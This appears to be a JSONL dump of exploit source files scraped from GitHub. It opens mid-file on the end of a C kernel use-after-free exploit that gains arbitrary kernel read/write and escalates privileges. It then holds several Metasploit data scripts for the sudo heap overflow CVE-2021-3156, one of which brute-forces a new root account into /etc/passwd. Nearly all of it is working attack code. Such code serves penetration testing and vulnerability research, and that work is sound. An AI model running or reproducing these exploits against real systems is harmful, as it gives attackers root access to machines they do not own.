  spray_sock[i] = new_socket();\n\n  for (int i = 0; i < NUM_KQUEUES; i++)\n    kq[i] = kqueue();\n\n  printf(\"[*] Triggering UAF...\\n\");\n  idx = trigger_uaf();\n  if (idx == -1) {\n    printf(\"[-] Error could not find overlap sock.\\n\");\n    exit(1);\n  }\n\n  // master_sock and overlap_sock point to the same pktopts\n  overlap_sock = spray_sock[idx];\n  spray_sock[idx] = new_socket();\n  printf(\"[+] Overlap socket: %x (%x)\\n\", overlap_sock, idx);\n\n  // Reallocate pktopts\n  for (int i = 0; i < NUM_SPRAY; i++) {\n    free_pktopts(spray_sock[i]);\n    set_tclass(spray_sock[i], 0);\n  }\n\n  // Fake master pktopts\n  idx = fake_pktopts(0);\n  overlap_sock = spray_sock[idx];\n  spray_sock[idx] = new_socket(); // use new socket so logic in spraying will be easier\n  printf(\"[+] Overlap socket: %x (%x)\\n\", overlap_sock, idx);\n\n  // Leak address of some kevent and pktopts\n  leak_kevent_pktopts();\n\n  // Fake master pktopts\n  idx = fake_pktopts(pktopts_addr + PKTOPTS_PKTINFO_OFFSET);\n  overlap_sock = spray_sock[idx];\n  printf(\"[+] Overlap socket: %x (%x)\\n\", overlap_sock, idx);\n\n  idx = find_victim_sock();\n  if (idx == -1) {\n    printf(\"[-] Error could not find victim sock.\\n\");\n    exit(1);\n  }\n\n  victim_sock = spray_sock[idx];\n  printf(\"[+] Victim socket: %x (%x)\\n\", victim_sock, idx);\n\n  printf(\"[+] Arbitrary R/W achieved.\\n\");\n\n  knote    = kread64(kevent_addr + kevent_sock * sizeof(uintptr_t));\n  kn_fop   = kread64(knote + KNOTE_FOP_OFFSET);\n  f_detach = kread64(kn_fop + FILTEROPS_DETACH_OFFSET);\n\n  printf(\"[+] knote: 0x%lx\\n\", knote);\n  printf(\"[+] kn_fop: 0x%lx\\n\", kn_fop);\n  printf(\"[+] f_detach: 0x%lx\\n\", f_detach);\n\n  printf(\"[+] Finding kernel base...\\n\");\n  kernel_base = find_kernel_base(f_detach);\n  printf(\"[+] Kernel base: 0x%lx\\n\", kernel_base);\n\n  printf(\"[+] Finding process cred and fd...\\n\");\n  find_proc_cred_and_fd(getpid());\n\n  printf(\"[*] Escalating privileges...\\n\");\n  escalate_privileges();\n\n  printf(\"[*] Cleaning up...\\n\");\n  cleanup();\n\n  printf(\"[+] Done.\\n\");\n\n  return 0;\n}\n", "timestamp": "2025-10-24T23:39:35.795574"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/CVE-2021-3156/nss_generic1.py", "content": "import sys\nimport os\nfrom ctypes import cdll, c_char_p, POINTER\n\nlibc = cdll.LoadLibrary(\"libc.so.6\")\nlibc.execve.argtypes = c_char_p,POINTER(c_char_p),POINTER(c_char_p)\n\nsmash_len_a    = int(sys.argv[1])\nsmash_len_b    = int(sys.argv[2])\nnull_stomp_len = int(sys.argv[3])\nlc_all_len     = int(sys.argv[4])\nso_overwrite   = sys.argv[5]\nworking_dir    = sys.argv[6]\n\nargv = [b'sudoedit', b'-s', b'#' * smash_len_a + b'\\\\', b'\\\\', b'#' * smash_len_b + b'\\\\', None]\ncmd = b'/usr/bin/sudoedit'\nenv = [b'\\\\'] * null_stomp_len\nenv.append(so_overwrite.encode('latin-1'))\nenv.append(b'LC_ALL=C.UTF-8@' + (b'C' * lc_all_len))\nenv.append(None)\n\ncargv = (c_char_p * len(argv))(*argv)\ncenvp = (c_char_p * len(env))(*env)\n\nos.chdir(working_dir)\nlibc.execve(cmd, cargv, cenvp)\n", "timestamp": "2025-10-24T23:39:36.116436"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/CVE-2021-3156/nss_generic2.py", "content": "#!/usr/bin/python3\n'''\nExploit for CVE-2021-3156 with overwrite struct service_user by sleepya\n\nFrom https://github.com/worawit/CVE-2021-3156\n\nThis exploit requires:\n- glibc with tcache\n- nscd service is not running\n\nTested on:\n- Ubuntu 18.04\n- Ubuntu 20.04\n- Debian 10\n- CentOS 8\n'''\nimport os\nimport subprocess\nimport sys\nfrom ctypes import cdll, c_char_p, POINTER, c_int, c_void_p\n\nSUDO_PATH = b\"/usr/bin/sudo\"\n\nlibc = cdll.LoadLibrary(\"libc.so.6\")\n\n# don't use LC_ALL (6). it override other LC_\nLC_CATS = [\n\tb\"LC_CTYPE\", b\"LC_NUMERIC\", b\"LC_TIME\", b\"LC_COLLATE\", b\"LC_MONETARY\",\n\tb\"LC_MESSAGES\", b\"LC_ALL\", b\"LC_PAPER\", b\"LC_NAME\", b\"LC_ADDRESS\",\n\tb\"LC_TELEPHONE\", b\"LC_MEASUREMENT\", b\"LC_IDENTIFICATION\"\n]\n\ndef check_is_vuln():\n\t# below commands has no log because it is invalid argument for both patched and unpatched version\n\t# patched version, error because of '-s' argument\n\t# unpatched version, error because of '-A' argument but no SUDO_ASKPASS environment\n\tr, w = os.pipe()\n\tpid = os.fork()\n\tif not pid:\n\t\t# child\n\t\tos.dup2(w, 2)\n\t\texecve(SUDO_PATH, [ b\"sudoedit\", b\"-s\", b\"-A\", b\"/aa\", None ], [ None ])\n\t\texit(0)\n\t# parent\n\tos.close(w)\n\tos.waitpid(pid, 0)\n\tr = os.fdopen(r, 'r')\n\terr = r.read()\n\tr.close()\n\t\n\tif \"sudoedit: no askpass program specified, try setting SUDO_ASKPASS\" in err:\n\t\treturn True\n\tassert err.startswith('usage: ') or \"invalid mode flags \" in err, err\n\treturn False\n\ndef check_nscd_condition():\n\tif not os.path.exists('/var/run/nscd/socket'):\n\t\treturn True # no socket. no service\n\t\n\t# try connect\n\timport socket\n\tsk = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)\n\ttry:\n\t\tsk.connect('/var/run/nscd/socket')\n\texcept:\n\t\treturn True\n\telse:\n\t\tsk.close()\n\n\twith open('/etc/nscd.conf', 'r') as f:\n\t\tfor line in f:\n\t\t\tline = line.strip()\n\t\t\tif not line.startswith('enable-cache'):\n\t\t\t\tcontinue # comment\n\t\t\tservice, enable = line.split()[1:]\n\t\t\t# in fact, if only passwd is enabled, exploit with this method is still possible (need test)\n\t\t\t# I think no one enable passwd but disable group\n\t\t\tif service == 'passwd' and enable == 'yes':\n\t\t\t\treturn False\n\t\t\t# group MUST be disabled to exploit sudo with nss_load_library() trick\n\t\t\tif service == 'group' and enable == 'yes':\n\t\t\t\treturn False\n\t\t\t\n\treturn True\n\ndef get_libc_version():\n\toutput = subprocess.check_output(['ldd', '--version'], universal_newlines=True)\n\tfor line in output.split('\\n'):\n\t\tif line.startswith('ldd '):\n\t\t\tver_txt = line.rsplit(' ', 1)[1]\n\t\t\treturn list(map(int, ver_txt.split('.')))\n\treturn None\n\ndef check_libc_version():\n\tversion = get_libc_version()\n\tassert version, \"Cannot detect libc version\"\n\t# this exploit only works which glibc tcache (added in 2.26)\n\treturn version[0] >= 2 and version[1] >= 26\n\ndef check_libc_tcache():\n\tlibc.malloc.argtypes = (c_int,)\n\tlibc.malloc.restype = c_void_p\n\tlibc.free.argtypes = (c_void_p,)\n\t# small bin or tcache\n\tsize1, size2 = 0xd0, 0xc0\n\tmems = [0]*32\n\t# consume all size2 chunks\n\tfor i in range(len(mems)):\n\t\tmems[i] = libc.malloc(size2)\n\t\t\n\tmem1 = libc.malloc(size1)\n\tlibc.free(mem1)\n\tmem2 = libc.malloc(size2)\n\tlibc.free(mem2)\n\tfor addr in mems:\n\t\tlibc.free(addr)\n\treturn mem1 != mem2\n\ndef get_service_user_idx():\n\t'''Parse /etc/nsswitch.conf to find a group entry index\n\t'''\n\tidx = 0\n\tfound = False\n\twith open('/etc/nsswitch.conf', 'r') as f:\n\t\tfor line in f:\n\t\t\tif line.startswith('#'):\n\t\t\t\tcontinue # comment\n\t\t\tline = line.strip()\n\t\t\tif not line:\n\t\t\t\tcontinue # empty line\n\t\t\twords = line.split()\n\t\t\tif words[0] == 'group:':\n\t\t\t\tfound = True\n\t\t\t\tbreak\n\t\t\tfor word in words[1:]:\n\t\t\t\tif word[0] != '[':\n\t\t\t\t\tidx += 1\n\t\t\t\n\tassert found, '\"group\" database is not found. might be exploitable but no test'\n\treturn idx\n\ndef get_extra_chunk_count(target_chunk_size):\n\t# service_user are allocated by calling getpwuid()\n\t# so we don't care allocation of chunk size 0x40 after getpwuid()\n\t# there are many string that size can be varied\n\t# here is the most common\n\tchunk_cnt = 0\n\t\n\t# get_user_info() -> get_user_groups() ->\n\tgids = os.getgroups()\n\tmalloc_size = len(\"groups=\") + len(gids) * 11\n\tchunk_size = (malloc_size + 8 + 15) & 0xfffffff0  # minimum size is 0x20. don't care here\n\tif chunk_size == target_chunk_size: chunk_cnt += 1\n\t\n\t# host=<hostname>  (unlikely)\n\t# get_user_info() -> sudo_gethostname()\n\timport socket\n\tmalloc_size = len(\"host=\") + len(socket.gethostname()) + 1\n\tchunk_size = (malloc_size + 8 + 15) & 0xfffffff0\n\tif chunk_size == target_chunk_size: chunk_cnt += 1\n\t\n\t# simply parse \"networks=\" from \"ip addr\" command output\n\t# another workaround is bruteforcing with number of 0x70\n\t# policy_open() -> format_plugin_settings() ->\n\t# a value is created from \"parse_args() -> get_net_ifs()\" with very large buffer\n\ttry:\n\t\timport ipaddress\n\texcept:\n\t\treturn chunk_cnt\n\tcnt = 0\n\tmalloc_size = 0\n\tproc = subprocess.Popen(['ip', 'addr'], stdout=subprocess.PIPE, bufsize=1, universal_newlines=True)\n\tfor line in proc.stdout:\n\t\tline = line.strip()\n\t\tif not line.startswith('inet'):\n\t\t\tcontinue\n\t\tif cnt < 2: # skip first 2 address (lo interface)\n\t\t\tcnt += 1\n\t\t\tcontinue;\n\t\taddr = line.split(' ', 2)[1]\n\t\tmask = str(ipaddress.ip_network(addr if sys.version_info >= (3,0,0) else addr.decode(\"UTF-8\"), False).netmask)\n\t\tmalloc_size += addr.index('/') + 1 + len(mask)\n\t\tcnt += 1\n\tmalloc_size += len(\"network_addrs=\") + cnt - 3 + 1\n\tchunk_size = (malloc_size + 8 + 15) & 0xfffffff0\n\tif chunk_size == target_chunk_size: chunk_cnt += 1\n\tproc.wait()\n\t\n\treturn chunk_cnt\n\ndef execve(filename, argv, envp):\n\tlibc.execve.argtypes = c_char_p,POINTER(c_char_p),POINTER(c_char_p)\n\t\n\tcargv = (c_char_p * len(argv))(*argv)\n\tcenvp = (c_char_p * len(envp))(*envp)\n\n\tlibc.execve(filename, cargv, cenvp)\n\ndef lc_env(cat_id, chunk_len):\n\tname = b\"C.UTF-8@\"\n\tname = name.ljust(chunk_len - 0x18, b'Z')\n\treturn LC_CATS[cat_id]+b\"=\"+name\n\nnss_lib = sys.argv[1]\nworking_dir = sys.argv[2]\n\nos.chdir(working_dir)\n\nassert check_is_vuln(), \"target is patched\"\nassert check_libc_version(), \"glibc is too old. The exploit is relied on glibc tcache feature. Need version >= 2.26\"\nassert check_libc_tcache(), \"glibc tcache is not found\"\nassert check_nscd_condition(), \"nscd service is running, exploit is impossible with this method\"\nservice_user_idx = get_service_user_idx()\nassert service_user_idx < 9, '\"group\" db in nsswitch.conf is too far, idx: %d' % service_user_idx\n\n# Note: actions[5] can be any value. library and known MUST be NULL\nFAKE_USER_SERVICE_PART = [ b\"\\\\\" ] * 0x18 + [ nss_lib.encode('latin-1') + b'\\\\' ]\n\nTARGET_OFFSET_START = 0x780\nFAKE_USER_SERVICE = FAKE_USER_SERVICE_PART*30\nFAKE_USER_SERVICE[-1] = FAKE_USER_SERVICE[-1][:-1]  # remove last '\\\\'. stop overwritten\n\nCHUNK_CMND_SIZE = 0xf0\n\n# Allow custom extra_chunk_cnt incase unexpected allocation\n# Note: this step should be no need when CHUNK_CMND_SIZE is 0xf0\nextra_chunk_cnt = get_extra_chunk_count(CHUNK_CMND_SIZE)\n\nargv = [ b\"sudoedit\", b\"-A\", b\"-s\", b\"A\"*(CHUNK_CMND_SIZE-0x10)+b\"\\\\\", None ]\nenv = [ b\"Z\"*(TARGET_OFFSET_START + 0xf - 8 - 1) + b\"\\\\\" ] + FAKE_USER_SERVICE\n# first 2 chunks are fixed. chunk40 (target service_user) is overwritten from overflown cmnd (in get_cmnd)\nenv.extend([ lc_env(0, 0x40)+b\";A=\", lc_env(1, CHUNK_CMND_SIZE) ])\n\n# add free chunks that created before target service_user\nfor i in range(2, service_user_idx+2):\n\t# skip LC_ALL (6)\n\tenv.append(lc_env(i if i < 6 else i+1, 0x40))\nif service_user_idx == 0:\n\tenv.append(lc_env(2, 0x20)) # for filling hole\n\nfor i in range(11, 11-extra_chunk_cnt, -1):\n\tenv.append(lc_env(i, CHUNK_CMND_SIZE))\n\nenv.append(lc_env(12, 0x90)) # for filling holes from freed file buffer\nenv.append(b\"TZ=:\")  # shortcut tzset function\n# don't put \"SUDO_ASKPASS\" environment. sudo will fail without logging if no segfault\nenv.append(None)\n\nexecve(SUDO_PATH, argv, env)\n", "timestamp": "2025-10-24T23:39:36.453178"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/CVE-2021-3156/nss_u14.py", "content": "#!/usr/bin/python\n'''\nExploit for CVE-2021-3156 on Ubuntu 14.04 by sleepya\n\nFrom https://github.com/worawit/CVE-2021-3156\n\nThis exploit requires:\n- glibc without tcache\n- nscd service is not running\n- only defaults /etc/nsswitch.conf (need adjust LC_* if changed)\n\nUbuntu 14.04 uses eglibc. A name in name_database_entry and service_user is pointer.\n- NULL name_database_entry->next, name_database_entry->service.\n- overwite name_database_entry->name with address in VSYSCALL\n- overwrite least significant byte of service_user->name to NULL. so a name pointer\n  points back to overwritten area.\n\nNote: Exploit might fail with certain configuration even on a tested target. Don't expect too much.\n\nTested on:\n- Ubuntu 14.04.3\n'''\nimport os\nimport sys\nfrom struct import pack\n\nSUDO_PATH = b\"/usr/bin/sudo\"\n\ndef execve(filename, argv, envp):\n\tfrom ctypes import cdll, c_char_p, POINTER\n\n\tlibc = cdll.LoadLibrary(\"libc.so.6\")\n\tlibc.execve.argtypes = c_char_p,POINTER(c_char_p),POINTER(c_char_p)\n\t\n\tcargv = (c_char_p * len(argv))(*argv)\n\tcenvp = (c_char_p * len(env))(*envp)\n\n\tlibc.execve(filename, cargv, cenvp)\n\ndef check_nsswitch():\n\tidx = 0\n\tfound_passwd = False\n\twith open('/etc/nsswitch.conf', 'r') as f:\n\t\tfor line in f:\n\t\t\tif line.startswith('#'):\n\t\t\t\tcontinue # comment\n\t\t\tline = line.strip()\n\t\t\tif not line:\n\t\t\t\tcontinue # empty line\n\t\t\twords = line.split()\n\t\t\tcnt = 0\n\t\t\tfor word in words[1:]:\n\t\t\t\tif word[0] != '[':\n\t\t\t\t\tcnt += 1\n\t\t\tif words[0] == 'group:':\n\t\t\t\tif not found_passwd:\n\t\t\t\t\treturn False\n\t\t\t\treturn cnt == 1\n\t\t\tif words[0] == 'passwd:':\n\t\t\t\tif cnt != 1:\n\t\t\t\t\treturn False\n\t\t\t\tfound_passwd = True\n\t\t\t# TODO: should check all line because they might affect offset\n\t\t\t\n\treturn False\n\nassert check_nsswitch(), '/etc/nsswith.conf is not default. offset is definitely wrong'\n\nTARGET_CMND_SIZE = 0x30\n\nlibnss = sys.argv[1]\nworking_dir = sys.argv[2]\n\nos.chdir(working_dir)\n\nargv = [ b\"sudoedit\", b\"-A\", b\"-s\", b\"a\", b\"a\", b\"A\"*(TARGET_CMND_SIZE-0x10-4)+b\"\\\\\", None ]\n\nenv = [\n\tb\"A\"*(0xf+0x50) +\n\tb\"\\\\\", b\"\\\\\", b\"\\\\\", b\"\\\\\", b\"\\\\\", b\"\\\\\", b\"\\\\\", b\"\\\\\", # name_database_entry->next\n\tb\"\\\\\", b\"\\\\\", b\"\\\\\", b\"\\\\\", b\"\\\\\", b\"\\\\\", b\"\\\\\", b\"\\\\\", # name_database_entry->service\n\tpack(\"<Q\", 0xffffffffff600880) + # address in vsyscall\n\tb\"A\"*0x18 + # name_database_entry->name, padding, service_user chunk size\n\tb\"A\"*0x10 +\n\tlibnss + \"\\\\\", # service_user->name\n\tb\"A\"*0x8 + \n\tb\"\\\\\", b\"\\\\\", b\"\\\\\", b\"\\\\\", b\"\\\\\", b\"\\\\\", b\"\\\\\", b\"\\\\\", # service_user->library\n\tb\"\\\\\", b\"\\\\\", b\"\\\\\", b\"\\\\\", b\"\\\\\", b\"\\\\\", b\"\\\\\", b\"\\\\\", # service_user->known\n\tb\"\", # NULL 1 byte of pointer to library name\n\tb\"LC_MESSAGES=C_zzzzzzzz.UTF-8@\"+b\"L\"*0x30+b\";a=a\",\n\tb\"LC_PAPER=C.UTF-8@\"+b\"L\"*0x10,\n\tb\"LC_NAME=C.UTF-8@\"+b\"L\"*0x1,\n\tb\"LC_TIME=C.UTF-8@\"+b\"L\"*0x1,\n\tb\"LANG=C.UTF-8@\"+b\"Z\"*0xd0,\n\tNone,\n]\n\nexecve(SUDO_PATH, argv, env)\n", "timestamp": "2025-10-24T23:39:36.786010"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/CVE-2021-3156/nss_u16.py", "content": "#!/usr/bin/python\n'''\nExploit for CVE-2021-3156 on Ubuntu 16.04 by sleepya\n\nFrom https://github.com/worawit/CVE-2021-3156\n\nThis exploit requires:\n- glibc without tcache\n- nscd service is not running\n- only defaults /etc/nsswitch.conf (need adjust LC_* if changed)\n\nBelow is important struct that MUST be carefully overwritten\n- NULL name_database_entry->next and name_database_entry->service\n- overwrite service_user object\n\nNote: Exploit might fail with certain configuration even on a tested target. Don't expect too much.\n\nTested on:\n- Ubuntu 16.04.1\n- Ubuntu 16.04\n'''\nimport os\nimport sys\n\nSUDO_PATH = b\"/usr/bin/sudo\"\n\ndef execve(filename, argv, envp):\n\tfrom ctypes import cdll, c_char_p, POINTER\n\n\tlibc = cdll.LoadLibrary(\"libc.so.6\")\n\tlibc.execve.argtypes = c_char_p,POINTER(c_char_p),POINTER(c_char_p)\n\t\n\tcargv = (c_char_p * len(argv))(*argv)\n\tcenvp = (c_char_p * len(env))(*envp)\n\n\tlibc.execve(filename, cargv, cenvp)\n\ndef check_nsswitch():\n\tidx = 0\n\tfound_passwd = False\n\twith open('/etc/nsswitch.conf', 'r') as f:\n\t\tfor line in f:\n\t\t\tif line.startswith('#'):\n\t\t\t\tcontinue # comment\n\t\t\tline = line.strip()\n\t\t\tif not line:\n\t\t\t\tcontinue # empty line\n\t\t\twords = line.split()\n\t\t\tcnt = 0\n\t\t\tfor word in words[1:]:\n\t\t\t\tif word[0] != '[':\n\t\t\t\t\tcnt += 1\n\t\t\tif words[0] == 'group:':\n\t\t\t\tif not found_passwd:\n\t\t\t\t\treturn False\n\t\t\t\treturn cnt == 1\n\t\t\tif words[0] == 'passwd:':\n\t\t\t\tif cnt != 1:\n\t\t\t\t\treturn False\n\t\t\t\tfound_passwd = True\n\t\t\t# TODO: should check all line because they affect offset\n\t\t\t\n\treturn False\n\nassert check_nsswitch(), '/etc/nsswith.conf is not default. offset is definitely wrong'\n\nTARGET_CMND_SIZE = 0x30\n\nlibnss_name = sys.argv[1]\nworking_dir = sys.argv[2]\n\nos.chdir(working_dir)\n\nargv = [ b\"sudoedit\", b\"-A\", b\"-s\", b\"a\", b\"a\", b\"A\"*(TARGET_CMND_SIZE-0x10-4)+b\"\\\\\", None ]\n\nenv = [\n\tb\"A\"*0xae+b\"\\\\\",\n\tb\"\\\\\", b\"\\\\\", b\"\\\\\", b\"\\\\\", b\"\\\\\", b\"\\\\\", b\"\\\\\", b\"\\\\\", # name_database_entry->next\n\tb\"\\\\\", b\"\\\\\", b\"\\\\\", b\"\\\\\", b\"\\\\\", b\"\\\\\", b\"\\\\\", b\"\\\\\", # name_database_entry->service\n\tb\"group\\\\\", b\"A\\\\\", # name_database_entry->name\n\tb\"A\"*0x27+b\"\\\\\",\n\tb\"\\\\\", b\"\\\\\", b\"\\\\\", b\"\\\\\", b\"\\\\\", b\"\\\\\", b\"\\\\\", b\"\\\\\", # service_user->library\n\tb\"\\\\\", b\"\\\\\", b\"\\\\\", b\"\\\\\", b\"\\\\\", b\"\\\\\", b\"\\\\\", b\"\\\\\", # service_user->known\n\tlibnss_name.encode('latin-1'),  # service_user->name\n\tb\"LC_MESSAGES=C_zzzzzzzz.UTF-8@\"+b\"L\"*0xd0+b\";a=a\",\n\tb\"LC_PAPER=C_gggg.UTF-8@\"+b\"L\"*0x30,\n\tb\"LC_NAME=C_gggg.UTF-8@\"+b\"L\"*0x4,\n\tb\"LC_TIME=C_gggg.UTF-8@\"+b\"L\"*0x1,\n\tb\"LANG=C.UTF-8@\"+b\"Z\"*0xd0,\n\tNone,\n]\n\nexecve(SUDO_PATH, argv, env)\n", "timestamp": "2025-10-24T23:39:37.140558"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/CVE-2021-3156/userspec_c7.py", "content": "#!/usr/bin/python\n'''\nExploit for CVE-2021-3156 on CentOS 7 by sleepya\n\nFrom https://github.com/worawit/CVE-2021-3156\n\nSimplified version of exploit_userspec.py for easy understanding.\n- Remove all checking code\n- Fixed all offset (no auto finding)\n\nNote: This exploit only work on sudo 1.8.23 on CentOS 7 with default configuration\n\nNote: Disable ASLR before running the exploit (also modify STACK_ADDR_PAGE below) if you don't want to wait for bruteforcing\n'''\nimport os\nimport sys\nimport resource\nfrom struct import pack\nfrom ctypes import cdll, c_char_p, POINTER\n\nnew_user = sys.argv[1]\nnew_hash = sys.argv[2]\n\nSUDO_PATH = b\"/usr/bin/sudo\"  # can be used in execve by passing argv[0] as \"sudoedit\"\n\nPASSWD_PATH = '/etc/passwd'\nAPPEND_CONTENT = new_user + \":\" + new_hash + \":0:0:\" + new_user + \":/root:/bin/bash\\n\"\nAPPEND_CONTENT = APPEND_CONTENT.encode('latin-1')\n\n#STACK_ADDR_PAGE = 0x7fffffff1000  # for ASLR disabled\nSTACK_ADDR_PAGE = 0x7fffe5d35000\n\nlibc = cdll.LoadLibrary(\"libc.so.6\")\nlibc.execve.argtypes = c_char_p,POINTER(c_char_p),POINTER(c_char_p)\n\ndef execve(filename, cargv, cenvp):\n\tlibc.execve(filename, cargv, cenvp)\n\ndef spawn_raw(filename, cargv, cenvp):\n\tpid = os.fork()\n\tif pid:\n\t\t# parent\n\t\t_, exit_code = os.waitpid(pid, 0)\n\t\treturn exit_code\n\telse:\n\t\t# child\n\t\texecve(filename, cargv, cenvp)\n\t\texit(0)\n\ndef spawn(filename, argv, envp):\n\tcargv = (c_char_p * len(argv))(*argv)\n\tcenvp = (c_char_p * len(env))(*env)\n\treturn spawn_raw(filename, cargv, cenvp)\n\n\nresource.setrlimit(resource.RLIMIT_STACK, (resource.RLIM_INFINITY, resource.RLIM_INFINITY))\n\n# expect large hole for cmnd size is correct\nTARGET_CMND_SIZE = 0x1b50\n\nargv = [ \"sudoedit\", \"-A\", \"-s\", PASSWD_PATH, \"A\"*(TARGET_CMND_SIZE-0x10-len(PASSWD_PATH)-1)+\"\\\\\", None ]\n\nSA = STACK_ADDR_PAGE\n\nADDR_REFSTR = pack('<Q', SA+0x20) # ref string\n\nADDR_PRIV_PREV = pack('<Q', SA+0x10)\nADDR_CMND_PREV = pack('<Q', SA+0x18) # cmndspec\nADDR_MEMBER_PREV = pack('<Q', SA+0x20)\n\nADDR_DEF_VAR = pack('<Q', SA+0x10)\nADDR_DEF_BINDING = pack('<Q', SA+0x30)\n\nOFFSET = 0x30 + 0x20\nADDR_USER = pack('<Q', SA+OFFSET)\nADDR_MEMBER = pack('<Q', SA+OFFSET+0x40)\nADDR_CMND = pack('<Q', SA+OFFSET+0x40+0x30)\nADDR_PRIV = pack('<Q', SA+OFFSET+0x40+0x30+0x60)\n\n# for spraying\nepage = [\n\t'A'*0x8 + # to not ending with 0x00\n\t\n\t# fake def->var chunk (get freed)\n\t'\\x21', '', '', '', '', '', '',\n\tADDR_PRIV[:6], '',  # pointer to privilege\n\tADDR_CMND[:6], '',  # pointer to cmndspec\n\tADDR_MEMBER[:6], '',  # pointer to member\n\t\n\t# fake def->binding (list head) (get freed)\n\t'\\x21', '', '', '', '', '', '',\n\t'', '', '', '', '', '', '', '',  # members.first\n\t'A'*0x10 + # members.last, pad\n\t\n\t# userspec chunk (get freed)\n\t'\\x41', '', '', '', '', '', '', # chunk metadata\n\t'', '', '', '', '', '', '', '',  # entries.tqe_next\n\t'A'*8 +  # entries.tqe_prev\n\t'', '', '', '', '', '', '', '',  # users.tqh_first\n\tADDR_MEMBER[:6]+'', '', # users.tqh_last\n\t'', '', '', '', '', '', '', '',  # privileges.tqh_first\n\tADDR_PRIV[:6]+'', '', # privileges.tqh_last\n\t'', '', '', '', '', '', '', '',  # comments.stqh_first\n\t\n\t# member chunk\n\t'\\x31', '', '', '', '', '', '', # chunk size , userspec.comments.stqh_last (can be any)\n\t'A'*8 + # member.tqe_next (can be any), userspec.lineno (can be any)\n\tADDR_MEMBER_PREV[:6], '',  # member.tqe_prev, userspec.file (ref string)\n\t'A'*8 + # member.name (can be any because this object is not freed)\n\tpack('<H', 284), '',  # type, negated\n\t'A'*0xc+ # padding\n\t\n\t# cmndspec chunk\n\t'\\x61'*0x8 + # chunk metadata (need only prev_inuse flag)\n\t'A'*0x8 + # entries.tqe_next\n\tADDR_CMND_PREV[:6], '',  # entries.teq_prev\n\t'', '', '', '', '', '', '', '',  # runasuserlist\n\t'', '', '', '', '', '', '', '',  # runasgrouplist\n\tADDR_MEMBER[:6], '',  # cmnd\n\t'\\xf9'+'\\xff'*0x17+ # tag (NOPASSWD), timeout, notbefore, notafter\n\t'', '', '', '', '', '', '', '',  # role\n\t'', '', '', '', '', '', '', '',  # type\n\t'A'*8 + # padding\n\t\n\t# privileges chunk\n\t'\\x51'*0x8 + # chunk metadata\n\t'A'*0x8 + # entries.tqe_next\n\tADDR_PRIV_PREV[:6], '',  # entries.teq_prev\n\t'A'*8 + # ldap_role\n\t'A'*8 + # hostlist.tqh_first\n\tADDR_MEMBER[:6], '',  # hostlist.teq_last\n\t'A'*8 +  # cmndlist.tqh_first\n\tADDR_CMND[:6], '',  # cmndlist.teq_last\n]\n\ncnt = sum(map(len, epage))\npadlen = 4096 - cnt - len(epage)\nepage.append('P'*(padlen-1))\n\nenv = [\n\t\"A\"*(7+0x4010 + 0x110) + # overwrite until first defaults\n\t\"\\x21\\\\\", \"\\\\\", \"\\\\\", \"\\\\\", \"\\\\\", \"\\\\\", \"\\\\\", \n\t\"A\"*0x18 + \n\t# defaults\n\t\"\\x41\\\\\", \"\\\\\", \"\\\\\", \"\\\\\", \"\\\\\", \"\\\\\", \"\\\\\", # chunk size\n\t\"\\\\\", \"\\\\\", \"\\\\\", \"\\\\\", \"\\\\\", \"\\\\\", \"\\\\\", \"\\\\\", # next\n\t'a'*8 + # prev\n\tADDR_DEF_VAR[:6]+'\\\\', '\\\\', # var\n\t\"\\\\\", \"\\\\\", \"\\\\\", \"\\\\\", \"\\\\\", \"\\\\\", \"\\\\\", \"\\\\\", # val\n\tADDR_DEF_BINDING[:6]+'\\\\', '\\\\', # binding\n\tADDR_REFSTR[:6]+'\\\\', '\\\\',  # file\n\t\"Z\"*0x8 +  # type, op, error, lineno\n\t\"\\x31\\\\\", \"\\\\\", \"\\\\\", \"\\\\\", \"\\\\\", \"\\\\\", \"\\\\\", # chunk size (just need valid)\n\t'C'*0x638+  # need prev_inuse and overwrite until userspec\n\t'B'*0x1b0+\n\t# userspec chunk\n\t# this chunk is not used because list is traversed with curr->prev->prev->next\n\t\"\\x61\\\\\", \"\\\\\", \"\\\\\", \"\\\\\", \"\\\\\", \"\\\\\", \"\\\\\", # chunk size\n\tADDR_USER[:6]+'\\\\', '\\\\', # entries.tqe_next points to fake userspec in stack\n\t\"A\"*8 + # entries.tqe_prev\n\t\"\\\\\", \"\\\\\", \"\\\\\", \"\\\\\", \"\\\\\", \"\\\\\", \"\\\\\", \"\\\\\",  # users.tqh_first\n\tADDR_MEMBER[:6]+'\\\\', '\\\\', # users.tqh_last\n\t\"\\\\\", \"\\\\\", \"\\\\\", \"\\\\\", \"\\\\\", \"\\\\\", \"\\\\\", \"\",  # privileges.tqh_first\n\t\n\t\"LC_ALL=C\",\n\t\"SUDO_EDITOR=/usr/bin/tee -a\", # append stdin to /etc/passwd\n\t\"TZ=:\",\n]\n\nENV_STACK_SIZE_MB = 4\nfor i in range(ENV_STACK_SIZE_MB * 1024 / 4):\n\tenv.extend(epage)\n\n# last element. prepare space for '/usr/bin/sudo' and extra 8 bytes\nenv[-1] = env[-1][:-len(SUDO_PATH)-1-8]\n\nenv.append(None)\n\ncargv = (c_char_p * len(argv))(*argv)\ncenvp = (c_char_p * len(env))(*env)\n\n# write passwd line in stdin. it will be added to /etc/passwd when success by \"tee -a\"\nr, w = os.pipe()\nos.dup2(r, 0)\nw = os.fdopen(w, 'w')\nw.write(APPEND_CONTENT)\nw.close()\n\nnull_fd = os.open('/dev/null', os.O_RDWR)\nos.dup2(null_fd, 2)\n\nfor i in range(16384):\n\tsys.stdout.write('%d\\r' % i)\n\tif i % 8 == 0:\n\t\tsys.stdout.flush()\n\texit_code = spawn_raw(SUDO_PATH, cargv, cenvp)\n\tif exit_code == 0:\n\t\tprint(\"Success at %d\" % i)\n\t\tbreak\nelse:\n    print(\"Brute force failed\")\n", "timestamp": "2025-10-24T23:39:37.479566"}
